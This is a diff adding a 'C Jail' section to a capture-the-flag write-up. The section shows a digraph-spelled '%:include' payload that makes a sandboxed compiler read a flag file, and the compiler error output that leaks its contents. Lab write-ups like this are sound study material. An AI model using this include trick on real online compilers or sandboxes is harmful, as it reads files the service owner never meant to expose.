@@ -645,6 +645,31 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 ![screenshot_20180729_011221](https://user-images.githubusercontent.com/22657154/43361354-2b9f7c20-92d5-11e8-928a-c812857a2cd9.png)
 
+## C Jail 1,2,3
+I'm not really an expert in C jail escaping but using this payload:
+```C
+%:include "/home/level{level_number}/flag.txt"
+```
+we can get the first three flags..
+<br>
+the program will try to include the flag and fail giving us the flag content as a compliling error.
+
+```C
+Compiling your code.
+In file included from /tmp/9868f2af-14a6-42cb-a06f-9f9916e8b294/bin.c:13:0:
+/home/level2/flag.txt: In function ‘_a7271eb818f091c987f823fe9d8dede9’:
+/home/level2/flag.txt:1:1: error: ‘FLAG’ undeclared (first use in this function)
+ FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
+ ^
+/home/level2/flag.txt:1:1: note: each undeclared identifier is reported only once for each function it appears in
+/home/level2/flag.txt:1:6: error: exponent has no digits
+ FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
+      ^
+/tmp/9868f2af-14a6-42cb-a06f-9f9916e8b294/bin.c:15:1: error: expected ‘;’ before ‘}’ token
+ }
+ ^
+ ```
+
 # Forensics 
 
 ## I made a dd of Agent Smith usb key
